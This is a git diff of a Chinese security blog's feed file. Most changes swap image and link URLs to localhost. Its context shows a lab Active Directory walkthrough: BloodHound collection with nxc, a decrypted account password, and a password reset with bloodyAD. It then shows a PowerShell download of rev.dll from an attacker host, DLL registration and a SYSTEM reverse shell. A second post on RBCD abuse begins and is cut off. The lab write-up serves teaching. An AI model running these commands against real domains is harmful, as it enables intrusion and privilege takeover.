 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 192.168.174.143:9389
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单扫描了一下确认为dc域控，那就不详细扫描了直接测试主要端口&lt;/p&gt;
 &lt;h2 id=&#34;突破边界&#34;&gt;突破边界
-&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image.png&#34;
+&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image.png&#34;
 	
 	
 	
@@ -8044,7 +8077,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;存在smb匿名，直接连接puppy，发现一张图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-1.png&#34;
 	
 	
 	
@@ -8053,7 +8086,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;一张意义不明的图片&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-2.png&#34;
 	
 	
 	
@@ -8096,7 +8129,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Image Size                      : 620x381
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Megapixels                      : 0.236
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在其中发现bilibili以及uid关键字，去b站查找到定位账号&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-3.png&#34;
 	
 	
 	
@@ -8150,7 +8183,7 @@ linux换行&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc ldap &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$pass1&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; --bloodhound --collection All --dns-server &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里我为了方便利用nxc去抓取，并且因为本地部署不影响，正常情况大家还是使用其他工具比较稳定&lt;/p&gt;
 &lt;p&gt;tindalos并未有稳定的出站，但是我找到了一个有意思的组&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-4.png&#34;
 	
 	
 	
@@ -8222,7 +8255,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Username    : lihua
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Unknown     : hello%2633
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;成功解密出lihua的账户密码&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-5.png&#34;
 	
 	
 	
@@ -8231,7 +8264,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;并且能成功登陆，查看猎犬&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-6.png&#34;
 	
 	
 	
@@ -8241,7 +8274,7 @@ linux换行&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;p&gt;发现lihua属于账户操作员组，对低权限所有用户都有通用掌控，于是我们直接能直接修改dns重启员的账户&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodyAD --host &amp;lt;DC_IP&amp;gt; -d &amp;lt;域名&amp;gt; -u &amp;lt;管理员用户名&amp;gt; -p &amp;lt;管理员密码&amp;gt; set password &amp;lt;目标用户&amp;gt; &amp;lt;新密码&amp;gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-7.png&#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-7.png&#34;
 	
 	
 	
@@ -8250,7 +8283,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;利用修改账号密码登陆&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-8.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-8.png&#34;
 	
 	
 	
@@ -8276,7 +8309,7 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;不要使用evil-winrm上传，因为evil-winrm的bug，看上去上传成功其实长度是0&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.174.129/rev.dll&amp;#34;&lt;/span&gt; -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\wirteTEMP\rev.dll&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还是使用古法上传，之后利用tindalos注册此dll&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-9.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-9.png&#34;
 	
 	
 	
@@ -8286,7 +8319,7 @@ linux换行&lt;/p&gt;
 &gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;注意这一步是无法回头的，注意快照
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后在jianyin用户上重启服务&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-10.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-10.png&#34;
 	
 	
 	
@@ -8295,7 +8328,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;从另外一边的监听直接接受shell&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-11.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-11.png&#34;
 	
 	
 	
@@ -8304,7 +8337,7 @@ linux换行&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;权限为system成功获取rootflag&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/bicker/image-12.png&#34;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/bicker/image-12.png&#34;
 	
 	
 	
@@ -8317,10 +8350,10 @@ linux换行&lt;/p&gt;
         </item>
         <item>
         <title>使用普通用户帐户远程利用RBCD</title>
-        <link>https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</link>
+        <link>http://localhost:1313/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</link>
         <pubDate>Sat, 23 Aug 2025 20:02:05 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</guid>
+        <guid>http://localhost:1313/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</guid>
         <description>&lt;h1 id=&#34;使用普通用户帐户远程利用-rbcd基于资源委派&#34;&gt;使用普通用户帐户远程利用 RBCD（基于资源委派）
 &lt;/h1&gt;&lt;h2 id=&#34;我是站在巨人们的肩膀上&#34;&gt;我是站在巨人们的肩膀上
 &lt;/h2&gt;&lt;p&gt;在这篇文章开始之前，我本来想详细解释一下rbcd，奈何&lt;a class=&#34;link&#34; href=&#34;https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
